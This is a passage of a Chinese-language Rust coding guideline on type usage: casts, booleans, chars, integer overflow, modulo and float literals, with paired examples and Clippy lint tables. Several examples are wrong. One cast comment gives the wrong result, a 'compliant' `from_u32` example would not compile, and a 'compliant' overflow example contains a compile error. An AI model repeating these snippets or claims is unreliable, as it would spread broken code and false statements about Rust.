<pre><pre class="playground"><code class="language-rust">#![warn(
    clippy::as_conversions,
    clippy::cast_lossless,
    clippy::cast_possible_truncation,
    clippy::cast_possible_wrap,
    clippy::cast_precision_loss,
    clippy::ptr_as_ptr
)]

fn as_u64(x: u8) -&gt; u64 {
    // 符合
    u64::from(x)
}

fn main() {
    let ptr: *const u32 = &amp;42_u32;
    let mut_ptr: *mut u32 = &amp;mut 42_u32;
    let _ = ptr.cast::&lt;i32&gt;(); // 符合
    let _ = mut_ptr.cast::&lt;i32&gt;(); // 符合
}
</code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#as_conversions">as_conversions</a></td><td>yes</td><td>no</td><td>restriction</td><td>allow</td></tr>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#cast_lossless">cast_lossless</a></td><td>yes</td><td>no</td><td>pedantic</td><td>allow</td></tr>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#cast_possible_truncation">cast_possible_truncation</a></td><td>yes</td><td>no</td><td>pedantic</td><td>allow</td></tr>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#cast_possible_wrap">cast_possible_wrap</a></td><td>yes</td><td>no</td><td>pedantic</td><td>allow</td></tr>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#cast_precision_loss">cast_precision_loss</a></td><td>yes</td><td>no</td><td>pedantic</td><td>allow</td></tr>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#cast_sign_loss">cast_sign_loss</a></td><td>yes</td><td>no</td><td>pedantic</td><td>allow</td></tr>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#fn_to_numeric_cast">fn_to_numeric_cast</a></td><td>yes</td><td>no</td><td>Style</td><td>warn</td></tr>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#fn_to_numeric_cast_with_truncation">fn_to_numeric_cast_with_truncation</a></td><td>yes</td><td>no</td><td>Style</td><td>warn</td></tr>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#char_lit_as_u8">char_lit_as_u8</a></td><td>yes</td><td>no</td><td>Complexity</td><td>warn</td></tr>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#cast_ref_to_mut">cast_ref_to_mut</a></td><td>yes</td><td>no</td><td>correctness</td><td>deny</td></tr>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#ptr_as_ptr">ptr_as_ptr</a></td><td>yes</td><td>no</td><td>pedantic</td><td>allow</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gtyp02--数字字面量在使用的时候应该明确标注类型"><a class="header" href="#gtyp02--数字字面量在使用的时候应该明确标注类型">G.TYP.02  数字字面量在使用的时候应该明确标注类型</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>如果数字字面量没有被指定具体类型，那么单靠类型推导，整数类型会被默认绑定为 <code>i32</code> 类型，而浮点数则默认绑定为 <code>f64</code>类型。这可能导致某些运行时的意外。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::default_numeric_fallback)]
<span class="boring">fn main() {
</span>// 不符合
let i = 10; // i32
let f = 1.23; // f64
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::default_numeric_fallback)]

<span class="boring">fn main() {
</span>// 符合
let i = 10u32;
let f = 1.23f32;
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#default_numeric_fallback">default_numeric_fallback</a></td><td>yes</td><td>no</td><td>restriction</td><td>allow</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gtyp03--不要用数字类型边界值判断能否安全转换而应使用-try_from-方法"><a class="header" href="#gtyp03--不要用数字类型边界值判断能否安全转换而应使用-try_from-方法">G.TYP.03  不要用数字类型边界值判断能否安全转换，而应使用 <code>try_from</code> 方法</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>在 Rust 中 <code>From</code> 代表不能失败的转换，而 <code>TryFrom</code> 则允许返回错误。</p>
<p>一般在数字类型转换的时候，不需要防御式地去判断数字大小边界，那样可读性比较差，应该使用 <code>try_from</code> 方法，在无法转换的时候处理错误即可。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::checked_conversions)]

<span class="boring">fn main() {
</span>// 不符合
let foo: u32 = 5;
let _ = foo &lt;= i16::MAX as u32; // 等价于 let _ = foo &lt;= (i32::MAX as u32);
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::checked_conversions)]

<span class="boring">fn main() {
</span>// 符合
let foo: u32 = 5; 
let f = i16::try_from(foo).is_ok(); // 返回 false
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#checked_conversions">checked_conversions</a></td><td>yes</td><td>no</td><td>pedantic</td><td>allow</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h1 id="布尔"><a class="header" href="#布尔">布尔</a></h1>
<p>Rust 中的布尔类型有 <code>true</code>和<code>false</code>两种值。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gtypbol01-不应将布尔值和布尔字面量进行比较"><a class="header" href="#gtypbol01-不应将布尔值和布尔字面量进行比较">G.TYP.BOL.01 不应将布尔值和布尔字面量进行比较</a></h2>
<p><strong>【级别】</strong> 要求</p>
<p><strong>【描述】</strong></p>
<p>在 Rust 中，返回为布尔值的表达式或函数值可以直接当作布尔值使用。</p>
<p>总之，使用布尔表达式的时候，要尽可能地简洁明了。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 不符合
if x == true {}
if y == false {}

assert_eq!(&quot;a&quot;.is_empty(), false);
assert_ne!(&quot;a&quot;.is_empty(), true);
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 符合
if x {}
if !y {}

assert!(!&quot;a&quot;.is_empty());
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#bool_comparison">bool_comparison </a></td><td>yes</td><td>no</td><td>complexity</td><td>warn</td></tr>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#bool_assert_comparison">bool_assert_comparison </a></td><td>yes</td><td>no</td><td>style</td><td>warn</td></tr>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#needless_bool">needless_bool </a></td><td>yes</td><td>no</td><td>complexity</td><td>warn</td></tr>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#nonminimal_bool">nonminimal_bool  </a></td><td>yes</td><td>no</td><td>complexity</td><td>warn</td></tr>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#needless_bitwise_bool">needless_bitwise_bool  </a></td><td>yes</td><td>no</td><td>pedantic</td><td>allow</td></tr>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#needless_bitwise_bool">assertions_on_constants  </a></td><td>yes</td><td>no</td><td>pedantic</td><td>warn</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gtypbol02-如果-match-匹配表达式为布尔类型宜使用-if-表达式来代替"><a class="header" href="#gtypbol02-如果-match-匹配表达式为布尔类型宜使用-if-表达式来代替">G.TYP.BOL.02 如果 match 匹配表达式为布尔类型，宜使用 <code>if</code> 表达式来代替</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>对于布尔表达式更倾向于使用 <code>if ... else ...</code>，相比 <code>match</code> 模式匹配更有利于代码可读性。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::match_bool)]

<span class="boring">fn main() {
</span><span class="boring">fn foo() {}
</span><span class="boring">fn bar() {}
</span>let condition: bool = true;
// 不符合
match condition {
    true =&gt; foo(),
    false =&gt; bar(),
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::match_bool)]

<span class="boring">fn main() {
</span><span class="boring">fn foo() {}
</span><span class="boring">fn bar() {}
</span>let condition: bool = true;
// 符合
if condition {
    foo();
} else {
    bar();
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#logic_bug">logic_bug </a></td><td>yes</td><td>no</td><td>correctness</td><td>deny</td></tr>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#match_bool">match_bool</a></td><td>yes</td><td>no</td><td>pedantic</td><td>allow</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gtypbol03-不应将数字类型转换为布尔值"><a class="header" href="#gtypbol03-不应将数字类型转换为布尔值">G.TYP.BOL.03 不应将数字类型转换为布尔值</a></h2>
<p><strong>【级别】</strong> 要求</p>
<p><strong>【描述】</strong></p>
<p>这可能会让布尔值在内存中的表示无效。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let x = 1_u8;
unsafe {
    // 不符合
    let _: bool = std::mem::transmute(x); // where x: u8
}

<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#transmute_int_to_bool">transmute_int_to_bool </a></td><td>yes</td><td>no</td><td>complexity</td><td>warn</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gtypbol04-禁止在if表达式条件中使用块结构"><a class="header" href="#gtypbol04-禁止在if表达式条件中使用块结构">G.TYP.BOL.04 禁止在if表达式条件中使用块结构</a></h2>
<p><strong>【级别】</strong> 要求</p>
<p><strong>【描述】</strong></p>
<p>为了增加可读性。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 不符合
if { true } { /* ... */ }

<span class="boring">fn somefunc() -&gt; bool { true };
</span>// 不符合
if { let x = somefunc(); x } { /* ... */ }
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 符合
if true { /* ... */ }

<span class="boring">fn somefunc() -&gt; bool { true };
</span>let res = { let x = somefunc(); x };
// 符合
if res { /* ... */ }
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#blocks_in_if_conditions">blocks_in_if_conditions  </a></td><td>yes</td><td>no</td><td>style</td><td>warn</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gtypbol05-非必要时布尔运算应使用逻辑运算符-而非位运算符-"><a class="header" href="#gtypbol05-非必要时布尔运算应使用逻辑运算符-而非位运算符-">G.TYP.BOL.05 非必要时，布尔运算应使用逻辑运算符( <code>&amp;&amp;/||</code>)而非位运算符 (<code>&amp;/|</code>)</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>位运算不支持短路（short-circuiting），所以会影响性能。逻辑运算符则支持短路。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::needless_bitwise_bool)]
<span class="boring">fn main() {
</span>let (x,y) = (true, false);
if x &amp; !y {} //  不符合：位运算符，不支持短路
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::needless_bitwise_bool)]

<span class="boring">fn main() {
</span>let (x,y) = (true, false);
if x &amp;&amp; !y {} //  符合：逻辑运算符，支持短路
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#needless_bitwise_bool">needless_bitwise_bool</a></td><td>yes</td><td>no</td><td>pedantic</td><td>allow</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gtypbol06--不应使用数字代替布尔值"><a class="header" href="#gtypbol06--不应使用数字代替布尔值">G.TYP.BOL.06  不应使用数字代替布尔值</a></h2>
<p><strong>【级别】</strong> 要求</p>
<p><strong>【描述】</strong></p>
<p>Rust 中布尔值就是 <code>true</code>  和 <code>false</code>。 不要试图使用数字 <code>1</code> 和 <code>0</code> 来代替布尔值。</p>
<p>虽然 布尔值 可以强转为 对应的数字，但是反之则不行。</p>
<p>不要通过判断数字来代替 布尔值，除非是 FFi 场景通过 C-ABI 和其他语言打交道。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 不符合
let a = 1;
let b = 0;
assert_eq!(true, a == 1);  
assert_eq!(false, b == 0);
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 符合
let a = true;
let b = false;
assert_eq!(true, a );
assert_eq!(false, b);
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gtypbol07-使用-not-方法代替逻辑取反运算符-"><a class="header" href="#gtypbol07-使用-not-方法代替逻辑取反运算符-">G.TYP.BOL.07 使用 <code>.not()</code> 方法代替逻辑取反运算符 (<code>!</code>)</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>逻辑取反运算符 (<code>!</code>) 是前缀一元运算符，相对较长的逻辑表达式来说很不显眼。</p>
<p>理解业务逻辑时，容易忽略取反符号，并且需要回头看。</p>
<p>使用 <code>.not()</code> 后缀方法 (<code>std::ops::Not</code>) 可以吸引注意力，视觉上更为连续。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>assert!(!self.map.contains(&amp;key));

if !cache.contains(&amp;key) {
    // ...
}

// 不符合：容易忽略取反符号
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use std::ops::Not;

assert!(self.map.contains(&amp;key).not());

if cache.contains(&amp;key).not() {
    // ...
}

// 符合：`.not()` 更容易吸引注意力
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="字符"><a class="header" href="#字符">字符</a></h1>
<p>在 Rust 中，字符是一个合法的 Unicode 标量值（Unicode scalar value），一个字符大小为 4 字节，对应一个 Unicode 码位（CodePoint）。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gtypchr01--不应将字符字面量强制转换为-u8"><a class="header" href="#gtypchr01--不应将字符字面量强制转换为-u8">G.TYP.CHR.01  不应将字符字面量强制转换为 <code>u8</code></a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>应该使用字节字面量，而不应使用字符字面量强转为 <code>u8</code>。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 不符合
'x' as u8
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 符合
b'x'
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#char_lit_as_u8">char_lit_as_u8</a></td><td>yes</td><td>no</td><td>complexity</td><td>warn</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gtypchr02-字符串方法中如果需要单个字符的值作为参数宜使用字符而非字符串"><a class="header" href="#gtypchr02-字符串方法中如果需要单个字符的值作为参数宜使用字符而非字符串">G.TYP.CHR.02 字符串方法中如果需要单个字符的值作为参数，宜使用字符而非字符串</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>大部分情况下，使用字符比用字符串性能更好。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 不符合
let s = &quot;yxz&quot;;
s.split(&quot;x&quot;);
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 符合
let s = &quot;yxz&quot;;
s.split('x');
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#single_char_pattern">single_char_pattern</a></td><td>yes</td><td>no</td><td>perf</td><td>warn</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gtypchr03-需要将整数转换为字符时应使用安全转换函数而非-transmute"><a class="header" href="#gtypchr03-需要将整数转换为字符时应使用安全转换函数而非-transmute">G.TYP.CHR.03 需要将整数转换为字符时，应使用安全转换函数，而非 <code>transmute</code></a></h2>
<p><strong>【级别】</strong> 要求</p>
<p><strong>【描述】</strong></p>
<p>并非每个整数都对应一个合法的 Unicode 标量值，使用 <code>transmute</code> 转换会有未定义行为。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let x = 37_u32;
unsafe {
    // 不符合
    let x: char = std::mem::transmute(x); // where x: u32
    assert_eq!('%', x);
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let x = 37_u32;

// 符合：x 会返回一个 Result 类型，开发者可以进行错误处理
let x = std::char::from_u32(x); 
assert_eq!('%', x);

// 符合：如果确定该整数对应合法的 unicode，可以使用 uncheck 方法加速
let x = unsafe {std::char::from_u32_unchecked(x) };  
assert_eq!('%', x);
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#transmute_int_to_char">transmute_int_to_char</a></td><td>yes</td><td>no</td><td>complexity</td><td>warn</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h1 id="整数"><a class="header" href="#整数">整数</a></h1>
<p>Rust 中有目前有十二种整数类型：<code>i8/u8</code>, <code>i16/u16</code>, <code>i32/u32</code>, <code>i64/u64</code>, <code>i128/u128</code>, <code>isize/usize</code> 。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gtypint01--在用整数计算的时候需要考虑整数溢出回绕和截断的风险"><a class="header" href="#gtypint01--在用整数计算的时候需要考虑整数溢出回绕和截断的风险">G.TYP.INT.01  在用整数计算的时候需要考虑整数溢出、回绕和截断的风险</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>如果从代码上下文的逻辑来看，该计算不可能产生溢出，则可以不进行校验。</p>
<p>比如，对于时间要求精准的系统，如果在计算时间发生整数溢出，或者去计算某个数组的索引等，那可能会发生严重问题。但如果你只是一个简单的计算器，不会被用到具体的业务场合，那溢出也没有关系，因为你只需要在合理的数字范围内计算性能最好。</p>
<p>在 Rust 标准库中，提供 <code>add</code>/ <code>checked_add</code> / <code> saturating_add</code>/<code>overflowing_add</code> / <code>wrapping_add</code> 不同系列方法，返回值不同，根据不同的场合选择适合的方法。</p>
<ol>
<li><code>check_*</code>函数返回<code>Option</code>，一旦发生溢出则返回None。</li>
<li><code>saturating_*</code>系列函数返回类型是整数，如果溢出，则给出该类型可表示范围的“最大/最小”值。</li>
<li><code>wrapping_*</code>系列函数则是直接抛弃已经溢出的最高位，将剩下的部分返回。即，返回直接二进制补码结果。</li>
<li><code>overflowing_*</code>系列函数返回二进制补码结果以及指示是否发生溢出的布尔值。</li>
</ol>
<p>Rust 编译器在编译时默认没有溢出检查（可通过编译参数来引入），但在运行时会有 Rust 内置 lint (<code>#[deny(arithmetic_overflow)]</code>)来检查，如果有溢出会 Panic。</p>
<p>无符号整数使用时要注意回绕(wrap around)，不同整数类型转换时需注意截断。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::integer_arithmetic)]

<span class="boring">fn main() {
</span>// 不符合
assert_eq!((-5i32).abs(), 5);
assert_eq!(100i32+1, 101);

fn test_integer_overflow() {

    // 不符合：这种写法 debug 与 release 编译时会有溢出检查
    let mut a: u8 = 255 + 1;
    
    // 不符合：这种写法，Rust 编译器不检查，但 Clippy可以检查到
    //  debug模式，运行 panic；release模式，x = 0
    let mut x: u8 = 255;
    x += 1;
    println!(&quot;x={}&quot;, x);
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::integer_arithmetic)]

<span class="boring">fn main() {
</span>// 符合
assert_eq!((-5i32).checked_abs(), Some(5));
assert_eq!(100i32.saturating_add(1), 101);

// 符合
fn add_num(a: u8) -&gt; u8 { a.wrapping_add(255) }

fn test_integer_overflow() {
    // 符合： 对于字面量或常量表达式，debug 与 release 编译模式都会有溢出检查
    let mut a: u8 = 255 + 1;

    // 符合
    // debug模式，运行会Panic
    // release模式，x 会等于 0
    let mut x: u8 = 255;
    x = add_num(x);
    println!(&quot;x={}&quot;, x);
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#integer_arithmetic">integer_arithmetic</a></td><td>yes</td><td>no</td><td>restriction</td><td>allow</td></tr>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#manual_saturating_arithmetic">manual_saturating_arithmetic</a></td><td>yes</td><td>no</td><td>style</td><td>warn</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gtypint02--避免在有符号整数和无符号整数之间进行强制转换"><a class="header" href="#gtypint02--避免在有符号整数和无符号整数之间进行强制转换">G.TYP.INT.02  避免在有符号整数和无符号整数之间进行强制转换</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>当有符号整数被强制转换为无符号整数时，负值会发生回绕（wrap around），变成更大的正值，这在实际应用时有可能助长缓冲区溢出风险。</p>
<blockquote>
<p>注意：在 Rust 中整数溢出属于 未指定（unspecified）行为，而非未定义行为 （见 RFC 560）。</p>
</blockquote>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">#![warn(clippy::cast_sign_loss)]
fn main(){
    let y: i8 = -1;
    y as u128; // will return 18446744073709551615
}
</code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">#![warn(clippy::cast_sign_loss)]

fn main(){
    let y : i8 = -1;
    // Error: 
    // the trait `From&lt;i8&gt;` is not implemented for `u128`
    // the trait bound `u128: From&lt;i8&gt;` is not satisfied
    let z = u128::from(y);
}
</code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#cast_sign_loss">cast_sign_loss</a></td><td>yes</td><td>no</td><td>pedantic</td><td>allow</td></tr>
</tbody></table>
<p>注意：默认情况下该 lint 是<code> allow</code>，如果需要检查这种转换，则需要设置为 <code>warn</code>或 <code>deny</code>。</p>
<h2 id="参考-1"><a class="header" href="#参考-1">参考</a></h2>
<ul>
<li><a href="https://huonw.github.io/blog/2016/04/myths-and-legends-about-integer-overflow-in-rust/">https://huonw.github.io/blog/2016/04/myths-and-legends-about-integer-overflow-in-rust/</a></li>
<li><a href="https://github.com/rust-lang/rfcs/blob/master/text/0560-integer-overflow.md">https://github.com/rust-lang/rfcs/blob/master/text/0560-integer-overflow.md</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gtypint03--对负数取模计算的时候不应使用"><a class="header" href="#gtypint03--对负数取模计算的时候不应使用">G.TYP.INT.03  对负数取模计算的时候不应使用<code>%</code></a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>Rust 中的 <code>%</code> 符号为余数运算符，它的行为与<code>C</code>或<code>Java</code>等语言中相同符号的运算符相同。它也类似于<code>Python</code>或<code>Haskell</code>等语言中的模（modulo）运算符，只是它对负数的行为不同：余数是基于截断除法，而模运算是基于向下取整（floor）除法。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">#![warn(clippy::modulo_arithmetic)]

fn main() {
    let a: i32 = -1;
    let b: i32 = 6;
    // 余数运算符只是返回第一个操作数除以第二个操作数的余数。所以 -1/6 给出 0，余数为 -1
    assert_eq!(a % b, -1);
}
</code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">#![warn(clippy::modulo_arithmetic)]

fn main() {
    let a: i32 = -1;
    let b: i32 = 6;
	//  取模是严格低于第二个操作数的自然数（所以是非负数），与第二个操作数的最大倍数相加，也低于或等于第一个操作数，则为第一个操作数。
    //  6的最大倍数低于或等于-1 是 -6（6*-1），模数是5，因为-6+5=-1。
    assert_eq!(a.rem_euclid(b), 5);
}
</code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#modulo_arithmetic">modulo_arithmetic</a></td><td>yes</td><td>no</td><td>restriction</td><td>allow</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h1 id="浮点数"><a class="header" href="#浮点数">浮点数</a></h1>
<p>Rust 的浮点数包括 <code>f32</code> 和 <code>f64</code> 两种类型。Rust 编译器默认推断的 Float 类型是 <code>f64</code>。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gtypflt01-使用浮点数字面量时要警惕是否存在被rust编译器截断的风险"><a class="header" href="#gtypflt01-使用浮点数字面量时要警惕是否存在被rust编译器截断的风险">G.TYP.FLT.01 使用浮点数字面量时，要警惕是否存在被Rust编译器截断的风险</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>当指定超过类型精度（<code>f32</code> 或 <code>f64</code>）的字面量值时，Rust 会默认截断该值。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 不符合
let v: f32 = 0.123_456_789_9;
println!(&quot;{}&quot;, v); //  0.123_456_789
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 符合
let v: f64 = 0.123_456_789_9;
